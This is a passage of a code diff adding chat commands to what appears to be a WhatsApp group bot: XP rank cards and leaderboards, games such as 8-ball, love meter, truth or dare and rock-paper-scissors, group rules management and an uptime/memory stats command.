+    if (!ctx.isGroup) throw new UserError('Levels are tracked in groups.');
+    const target = ctx.targets()[0];
+    const id = target ? ctx.jidUser(target) : ctx.senderNum;
+    const all = board(ctx);
+    const pos = all.findIndex(u => u.id === id);
+    if (pos < 0) throw new UserError(target ? 'That person has no XP yet.' : 'You have no XP yet. Chat in the group to earn some!');
+    const u = all[pos], lvl = levelOf(u.xp), lo = xpFor(lvl), hi = xpFor(lvl + 1);
+    await ctx.reply(`👤 ${bold(u.name || '+' + u.id)}\n🏅 Rank: ${bold('#' + (pos + 1))} of ${all.length}\n⭐ Level: ${bold(String(lvl))}\n✨ XP: ${u.xp}  (${hi - u.xp} to level ${lvl + 1})\n${bar((u.xp - lo) / (hi - lo))}\n💬 Messages: ${u.msgs}`, { title: 'Rank card' });
+  });
+
+  def(['top', 'ranks', 'chatboard'], { cat: 'community', usage: 'top', desc: 'Top 10 most active members of this group.' }, async ctx => {
+    if (!ctx.isGroup) throw new UserError('Levels are tracked in groups.');
+    const all = board(ctx).slice(0, 10);
+    if (!all.length) throw new UserError('Nobody has XP yet. Start chatting!');
+    await ctx.reply(all.map((u, i) => `${medal(i)} ${bold(u.name || '+' + u.id)} — Lv ${levelOf(u.xp)} • ${u.xp} XP`).join('\n'), { title: 'Top chatters' });
+  });
+
+  /* ---------------- fun ---------------- */
+  def(['8ball', 'ball'], { cat: 'game', usage: '8ball <question>', desc: 'Ask the magic 8-ball.' }, async ctx => {
+    if (!ctx.args) throw new UserError(`Ask a question, e.g. *${P(ctx)}8ball will I pass?*`);
+    await ctx.reply(`❓ ${ctx.args}\n\n🎱 ${bold(BALL[Math.floor(Math.random() * BALL.length)])}`, { title: 'Magic 8-ball' });
+  });
+
+  def(['ship', 'love'], { cat: 'game', usage: 'ship <name> & <name>   (or @mention two people)', desc: 'Love compatibility between two names.' }, async ctx => {
+    let names = ctx.args.split(/\s*(?:&|\+|,|\band\b|\bx\b)\s*/i).map(x => x.replace(/@/g, '').trim()).filter(Boolean);
+    if (names.length === 1) names.unshift(ctx.name || 'You');
+    if (names.length < 2) throw new UserError(`Usage: *${P(ctx)}ship Amina & Brian*`);
+    names = names.slice(0, 2);
+    const pct = hash([...names].map(n => n.toLowerCase()).sort().join('+')) % 101;
+    const msg = pct > 85 ? 'Soulmates! 💍' : pct > 65 ? 'Great match! 💖' : pct > 40 ? 'There is potential 🙂' : pct > 20 ? 'Just friends 🤝' : 'Not meant to be 💔';
+    await ctx.reply(`💘 ${bold(names[0])} + ${bold(names[1])}\n\n${bar(pct / 100)} ${bold(pct + '%')}\n${msg}`, { title: 'Love meter' });
+  });
+
+  def('truth', { cat: 'game', desc: 'A random truth question for truth or dare.' }, async ctx => ctx.reply(TRUTHS[Math.floor(Math.random() * TRUTHS.length)], { title: 'Truth 🫣' }));
+  def('dare', { cat: 'game', desc: 'A random dare for truth or dare.' }, async ctx => ctx.reply(DARES[Math.floor(Math.random() * DARES.length)], { title: 'Dare 😈' }));
+
+  def(['choose', 'pick'], { cat: 'game', usage: 'choose pizza | burger | chips', desc: 'Let the bot pick for you. Separate options with | or commas.' }, async ctx => {
+    const opts = ctx.args.split(/\s*[|,]\s*|\s+or\s+/i).map(x => x.trim()).filter(Boolean);
+    if (opts.length < 2) throw new UserError(`Give at least two options: *${P(ctx)}choose pizza | burger*`);
+    await ctx.reply(`🤔 ${opts.join('  •  ')}\n\n👉 ${bold(opts[Math.floor(Math.random() * opts.length)])}`, { title: 'Decision' });
+  });
+
+  def('rps', { cat: 'game', usage: 'rps rock|paper|scissors', desc: 'Rock paper scissors against the bot.' }, async ctx => {
+    const map = { rock: '🪨', paper: '📄', scissors: '✂️', r: 'rock', p: 'paper', s: 'scissors' };
+    const me = ({ r: 'rock', p: 'paper', s: 'scissors' })[ctx.argv[0]?.toLowerCase()] || ctx.argv[0]?.toLowerCase();
+    if (!['rock', 'paper', 'scissors'].includes(me)) throw new UserError(`Choose one: *${P(ctx)}rps rock*, *paper* or *scissors*`);
+    const bot = ['rock', 'paper', 'scissors'][Math.floor(Math.random() * 3)];
+    const win = me === bot ? 'draw' : ({ rock: 'scissors', paper: 'rock', scissors: 'paper' })[me] === bot ? 'win' : 'lose';
+    await ctx.reply(`You: ${map[me]} ${me}\nBot: ${map[bot]} ${bot}\n\n${win === 'win' ? '🎉 You win!' : win === 'lose' ? '😎 I win!' : '🤝 Draw!'}`, { title: 'Rock Paper Scissors' });
+  });
+
+  /* ---------------- group helpers ---------------- */
+  def('setrules', { cat: 'group', usage: 'setrules <text> • setrules off', desc: 'Set the rules shown by .rules (group admins).' }, async ctx => {
+    if (!ctx.isGroup) throw new UserError('Use this in a group.');
+    if (!ctx.isOwner && !(await ctx.admin())) throw new UserError('Only group admins can set the rules.');
+    if (!ctx.args) throw new UserError(`Usage: *${P(ctx)}setrules 1. Be kind 2. No spam*`);
+    if (/^(off|clear|delete)$/i.test(ctx.args)) { ctx.update('rules', {}, o => { delete o[ctx.chat]; }); return ctx.reply('🗑️ Rules removed.'); }
+    ctx.update('rules', {}, o => { o[ctx.chat] = ctx.args.slice(0, 1500); });
+    await ctx.reply(`✅ Rules saved. Members can read them with *${P(ctx)}rules*.`, { title: 'Group rules' });
+  });
+  def('rules', { cat: 'group', desc: 'Show the group rules.' }, async ctx => {
+    if (!ctx.isGroup) throw new UserError('Use this in a group.');
+    const r = ctx.get('rules', {})[ctx.chat];
+    if (!r) throw new UserError(`No rules set yet. Admins: *${P(ctx)}setrules <text>*`);
+    await ctx.reply(r, { title: 'Group rules' });
+  });
+  def(['admins', 'staff'], { cat: 'group', desc: 'List and mention the group admins.' }, async ctx => {
+    const meta = await ctx.group();
+    const adm = meta.participants.filter(p => ctx.isAdminP(p));
+    if (!adm.length) throw new UserError('No admins found.');
+    const jids = adm.map(p => p.phoneNumber || p.jid || p.id);
+    await ctx.send({ text: ctx.frame(jids.map((j, i) => `${i + 1}. @${ctx.jidUser(j)}`).join('\n'), `Admins (${adm.length})`), mentions: jids }, { quoted: ctx.msg });
+  });
+
+  /* ---------------- bot info ---------------- */
+  def(['stats', 'uptime', 'botinfo'], { cat: 'bot', desc: 'Bot uptime, memory use and status.' }, async ctx => {
+    const up = process.uptime();
+    const d = Math.floor(up / 86400), h = Math.floor(up % 86400 / 3600), m = Math.floor(up % 3600 / 60);
+    const mem = process.memoryUsage();
+    await ctx.reply([
+      `⏱️ ${bold('Uptime')}: ${d ? d + 'd ' : ''}${h}h ${m}m`,
+      `🧠 ${bold('Memory')}: ${Math.round(mem.rss / 1048576)} MB`,
+      `⚙️ ${bold('Node')}: ${process.version}`,
+      `🔣 ${bold('Prefix')}: ${P(ctx)}   •   🔐 ${bold('Mode')}: ${ctx.var('MODE') || 'public'}`,
+      `🎨 ${bold('Frame')}: ${ctx.var('FRAME_STYLE')}   •   📡 ${bold('Channel header')}: ${ctx.var('CHANNEL_FORWARD') === 'off' ? 'off' : 'on'}`
+    ].join('\n'), { title: 'Bot stats' });
+  });
+};
+
+module.exports._test = { levelOf, xpFor };
